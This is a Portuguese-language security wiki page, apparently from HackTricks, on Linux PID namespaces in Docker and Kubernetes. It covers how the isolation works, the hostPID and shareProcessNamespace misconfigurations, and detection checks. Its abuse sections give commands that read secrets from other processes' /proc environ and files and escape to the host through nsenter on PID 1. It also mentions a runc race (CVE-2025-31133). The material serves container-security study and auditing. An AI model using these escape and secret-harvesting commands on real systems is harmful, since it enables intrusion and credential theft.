# Namespace de PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de PID controla como os processos são numerados e quais processos ficam visíveis. É por isso que um container pode ter seu próprio PID 1, embora não seja uma máquina real. Dentro do namespace, a carga de trabalho vê o que parece ser uma árvore de processos local. Fora do namespace, o host ainda vê os PIDs reais do host e todo o panorama de processos.<sup>[[3]](#references)</sup>

Do ponto de vista da segurança, o namespace de PID é importante porque a visibilidade dos processos é valiosa. Quando uma carga de trabalho consegue ver processos do host, ela pode observar nomes de serviços, argumentos de linha de comando, segredos passados como argumentos de processos, dados derivados do ambiente por meio de `/proc` e possíveis alvos para entrada em namespaces. Se ela consegue fazer mais do que apenas ver esses processos — por exemplo, enviar sinais ou usar ptrace nas condições adequadas —, o problema se torna muito mais sério.

## Funcionamento

Um novo namespace de PID começa com sua própria numeração interna de processos. O primeiro processo criado dentro dele se torna o PID 1 do ponto de vista do namespace, o que também significa que ele recebe semânticas especiais, semelhantes às de init, para processos filhos órfãos e o comportamento de sinais. Isso explica muitas peculiaridades dos containers relacionadas a processos init, à coleta de processos zumbis e ao uso ocasional de wrappers init pequenos em containers.<sup>[[3]](#references)</sup>

Os namespaces de PID formam uma hierarquia. Um processo em um namespace ancestral pode endereçar processos descendentes usando o PID atribuído nesse ancestral, mas um descendente não pode endereçar tarefas que existam apenas em um ancestral por meio de syscalls comuns baseadas em PID, nem usar `setns()` para subir a um namespace de PID ancestral. Um procfs pertencente a um ancestral e deliberadamente exposto ao descendente ainda pode vazar a visão de processos do ancestral. Além disso, entrar em um namespace de PID com `setns()` altera o namespace dos **futuros filhos**, não o do próprio chamador; por isso, as ferramentas criam um processo filho depois de entrar. Uma montagem de procfs mantém a visão de PID do processo que a montou, e é por isso que criar um procfs novo após `unshare(CLONE_NEWPID)` é relevante para a segurança, não apenas cosmético.<sup>[[3]](#references)</sup>

A principal lição de segurança é que um processo pode parecer isolado porque vê apenas sua própria árvore de PIDs, mas esse isolamento pode ser removido deliberadamente. O Docker oferece isso por meio de `--pid=host`, enquanto o Kubernetes faz o mesmo com `hostPID: true`. Quando o container entra no namespace de PID do host, a carga de trabalho passa a ver os processos do host diretamente, e muitos caminhos de ataque subsequentes se tornam muito mais viáveis.

## Laboratório

Para criar manualmente um namespace de PID:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

O shell agora vê uma visão privada dos processos. A flag `--mount-proc` é importante porque monta uma instância de procfs que corresponde ao novo PID namespace, tornando coerente a lista de processos vista de dentro.<sup>[[3]](#references)</sup>

Para comparar o comportamento dos containers:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

A diferença é imediata e fácil de entender, por isso este é um bom primeiro laboratório para os leitores.

## Uso em tempo de execução

Contêineres comuns no Docker, Podman, containerd e CRI-O têm seu próprio PID namespace. No Kubernetes, os contêineres normalmente têm visualizações de PID separadas; `shareProcessNamespace: true` cria deliberadamente uma visualização para todo o Pod.<sup>[[4]](#references)</sup> Em contrapartida, `hostPID: true` seleciona o PID namespace do node. Ambientes LXC/Incus usam a mesma primitiva do kernel, embora os casos de uso de system containers possam expor árvores de processos mais complexas e incentivar mais atalhos de debugging.

A mesma regra se aplica em todos os lugares: se o runtime optou por não isolar o PID namespace, isso representa uma redução deliberada do limite de segurança do contêiner.

## Configurações incorretas

A configuração incorreta mais comum é o compartilhamento do PID do host. As equipes costumam justificá-lo pela conveniência de debugging, monitoramento ou gerenciamento de serviços, mas ele sempre deve ser tratado como uma exceção de segurança significativa. Mesmo que o contêiner não tenha um recurso imediato de escrita sobre os processos do host, só a visibilidade já pode revelar muito sobre o sistema. Quando capacidades como `CAP_SYS_PTRACE` ou acesso útil ao procfs são adicionadas, o risco aumenta significativamente.

Outro erro é presumir que, como a carga de trabalho não pode encerrar processos do host nem usar ptrace neles por padrão, o compartilhamento do PID do host é inofensivo. Essa conclusão ignora o valor da enumeração, a disponibilidade de destinos para entrada em namespaces e a forma como a visibilidade de PID se combina com outros controles enfraquecidos.

### Compartilhamento de processos em todo o Pod no Kubernetes

`shareProcessNamespace: true` é diferente de `hostPID`: ele expõe os processos dos **outros contêineres no mesmo Pod**, não os processos do node. Um sidecar comprometido ou um contêiner de debugging pode então enumerar as linhas de comando e os dados de ambiente dos contêineres irmãos, sujeito às verificações de acesso do procfs, enviar sinais quando as credenciais permitirem e percorrer o sistema de arquivos de um contêiner irmão por meio de `/proc/<pid>/root`. O Kubernetes alerta explicitamente que, nesse caso, os segredos da linha de comando/do ambiente e os sistemas de arquivos dos contêineres são protegidos apenas pelas permissões Unix aplicáveis.<sup>[[4]](#references)</sup>

Revisão útil no cluster:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

De um contêiner comprometido em um namespace PID compartilhado por todo o Pod, primeiro teste o acesso real em vez de presumir que visibilidade significa legibilidade:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Contêineres efêmeros direcionados em um Pod Kubernetes existente

Uma identidade do Kubernetes com permissão para modificar `pods/ephemeralcontainers` pode adicionar um debugger a um Pod em execução mesmo quando `shareProcessNamespace` não está definido. Com `--target`, o debugger entra no namespace de processos do contêiner indicado, se o runtime oferecer suporte ao direcionamento de namespaces. Isso permite visualizar os processos desse contêiner, não o namespace PID do host do nó.<sup>[[5]](#references)</sup>

A API usa um subresource separado; portanto, verifique as permissões de `patch`/`update` em vez de presumir que as permissões comuns de escrita em Pods também o abrangem.<sup>[[6]](#references)</sup>

Para um Pod e um contêiner em um namespace autorizado, teste a visualização direcionada:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Se o runtime não implementar o targeting, o debugger poderá não iniciar ou permanecer em um PID namespace isolado.<sup>[[5]](#references)</sup> Se o targeting funcionar, use as verificações em [Compartilhamento de processos em todo o Pod do Kubernetes](#kubernetes-pod-wide-process-sharing) para testar o acesso a `/proc/<pid>`. A visibilidade não dá permissão para ler os segredos do alvo nem enviar sinais a ele: as credenciais Unix e as verificações de acesso do procfs continuam se aplicando.<sup>[[4]](#references)[[8]](#references)</sup> Os Pod Security Standards também impõem restrições às configurações privilegiadas em contêineres efêmeros.<sup>[[7]](#references)</sup>

## Abuso

Se o PID namespace do host for compartilhado, um atacante poderá inspecionar os processos do host, coletar argumentos de processos, identificar serviços interessantes, encontrar PIDs candidatos para `nsenter` ou combinar a visibilidade dos processos com privilégios relacionados a ptrace para interferir em workloads do host ou de workloads vizinhos. Em alguns casos, basta ver o processo de longa execução certo para reformular o restante do plano de ataque.

O primeiro passo prático é sempre confirmar se os processos do host estão realmente visíveis:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Assim que os PIDs do host ficam visíveis, os argumentos dos processos e os alvos de entrada em namespaces costumam se tornar a fonte de informação mais útil:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Se `nsenter` estiver disponível e houver privilégios suficientes, teste se um processo visível do host pode ser usado como uma ponte entre namespaces:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Mesmo quando a entrada é bloqueada, o compartilhamento de PID do host já é valioso, pois revela a disposição dos serviços, os componentes de runtime e processos privilegiados que podem ser alvos em seguida. A visibilidade de PID, por si só, **não** concede permissão para enviar sinais, rastrear, ler entradas sensíveis de `/proc/<pid>` ou ingressar nos outros namespaces do alvo; as credenciais, a capacidade de dump, as capabilities no user namespace proprietário do namespace do alvo, as políticas do Yama/LSM e o seccomp ainda são relevantes.<sup>[[3]](#references)</sup> Consulte [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) para ver exemplos de injeção de processos.

A visibilidade de PID do host também torna mais plausível o abuso de descritores de arquivo. Se um processo privilegiado do host ou uma workload vizinha tiver um arquivo ou socket sensível aberto, o atacante poderá inspecionar `/proc/<pid>/fd/` e acessar o objeto subjacente, dependendo das verificações no estilo ptrace, da propriedade, das opções de montagem do procfs, do tipo de objeto e do modelo do serviço-alvo. O simples fato de ver um link simbólico de FD não significa que ele possa ser aberto, e um socket não pode ser duplicado apenas abrindo seu link simbólico em `/proc/<pid>/fd/N`. Para a primitiva distinta `pidfd_getfd()` e suas verificações de autorização, consulte [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Esses comandos são úteis porque mostram se `hidepid=1` ou `hidepid=2` está reduzindo a visibilidade entre processos e se descritores obviamente interessantes, como arquivos secretos abertos, logs ou sockets Unix, estão visíveis.

### Exemplo completo: PID do host + `nsenter`

O compartilhamento do PID do host pode permitir escapar do host quando o processo tem os recursos necessários para ingressar nos namespaces do host e adotar a raiz do processo do host. `nsenter --root` (`-r`) é necessário para isso: mudar apenas o namespace de montagem não altera o diretório raiz do chamador.<sup>[[9]](#references)</sup> O acesso a `/proc/1/root` está sujeito a uma verificação de leitura do ptrace, enquanto a mudança de raiz exige `CAP_SYS_CHROOT` no namespace de usuário do chamador.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Se o comando for bem-sucedido, o novo shell usará os namespaces de montagem, UTS, rede, IPC e PID do host e o sistema de arquivos raiz do PID 1. Verifique a identidade efetiva e o acesso, em vez de presumir que apenas a visibilidade dos PIDs concedeu privilégios no host.<sup>[[9]](#references)</sup>

Mesmo quando o próprio `nsenter` estiver ausente, talvez seja possível obter o mesmo resultado usando o binário do host, se o sistema de arquivos do host estiver montado:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Notas recentes sobre runtime

Alguns ataques relevantes para PID namespaces não são configurações incorretas tradicionais de `hostPID: true`, mas bugs de implementação do runtime relacionados à aplicação das proteções do procfs durante a configuração do container.

#### Race de `maskedPaths` para acessar o procfs do host

Em versões vulneráveis do `runc`, atacantes capazes de controlar a imagem do container ou a carga de trabalho de `runc exec` podiam explorar uma race durante a etapa de mascaramento, substituindo o `/dev/null` do container por um symlink para um caminho sensível do procfs, como `/proc/sys/kernel/core_pattern`. Se a race fosse bem-sucedida, o bind mount do caminho mascarado poderia atingir o destino errado e expor configurações globais do procfs do host ao novo container.<sup>[[1]](#references)</sup>

Comando útil para revisão:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Isso é importante porque o impacto final pode ser o mesmo que o da exposição direta do procfs: `core_pattern` ou `sysrq-trigger` com permissão de escrita, seguidos da execução de código no host ou de uma negação de serviço. As páginas dedicadas a [masked paths](../masked-paths.md) e [sensitive host mounts](../../sensitive-host-mounts.md) cobrem a superfície de ataque geral do procfs sem duplicar o conteúdo aqui.

#### Injeção de namespace com `insject`

Ferramentas de injeção de namespace, como `insject`, mostram que a interação com o PID namespace nem sempre exige entrar no namespace de destino antes da criação do processo. Um helper pode se conectar posteriormente, usar `setns()` e executar preservando a visibilidade do espaço de PIDs de destino:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Esse tipo de técnica é importante principalmente para depuração avançada, ferramentas ofensivas e fluxos de post-exploitation em que o contexto de namespace precisa ser associado depois que o runtime já inicializou a carga de trabalho.

### Padrões relacionados de abuso de FD

Dois padrões merecem ser destacados explicitamente quando os PIDs do host estão visíveis. Primeiro, um processo privilegiado pode manter um descritor de arquivo sensível aberto após `execve()` porque ele não foi marcado com `O_CLOEXEC`. Segundo, serviços podem passar descritores de arquivo por sockets Unix usando `SCM_RIGHTS`. Em ambos os casos, o objeto de interesse deixa de ser o caminho e passa a ser o handle já aberto que um processo com menos privilégios pode herdar ou receber.

Isso é importante ao trabalhar com containers porque o handle pode apontar para `docker.sock`, um log privilegiado, um arquivo secreto do host ou outro objeto de alto valor, mesmo quando o caminho em si não está diretamente acessível pelo sistema de arquivos do container.

## Verificações

O objetivo destes comandos é determinar se o processo tem uma visão privada de PIDs ou se já pode enumerar um panorama de processos muito mais amplo.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

O que é interessante aqui:<sup>[[3]](#references)</sup>

- Se a lista de processos contiver serviços do host claramente identificáveis, provavelmente o compartilhamento de PID do host já está ativo.
- Ver apenas uma pequena árvore local do container é o comportamento normal; ver `systemd`, `dockerd` ou daemons não relacionados não é.
- `NSpid` pode revelar o mapeamento de PID entre namespaces aninhados. O valor mais à esquerda é relativo ao namespace de PID associado à montagem de procfs, seguido pelos valores dos namespaces sucessivamente aninhados.
- `readlink /proc/self/ns/pid`, por si só, não comprova `hostPID`: um container isolado também tem um inode válido de namespace de PID. Compare-o com a lista de processos, a montagem de procfs, a configuração do runtime e, quando disponível, um inode de namespace no host.
- Depois que os PIDs do host ficam visíveis, até mesmo informações de processos somente para leitura se tornam úteis para reconhecimento.

Se descobrir que um container está sendo executado com compartilhamento de PID do host, não trate isso como uma diferença meramente estética. Isso altera substancialmente o que a carga de trabalho pode observar e potencialmente afetar.





## References

- [1] [Aviso de segurança do runc: escape de container por abuso de "masked path" devido a condições de corrida na montagem (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Lançamento da ferramenta – insject: um injetor de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Livro Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Compartilhar o namespace de processos entre containers em um Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Depurar Pods em execução](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP de containers efêmeros](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Padrões de segurança de Pods](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
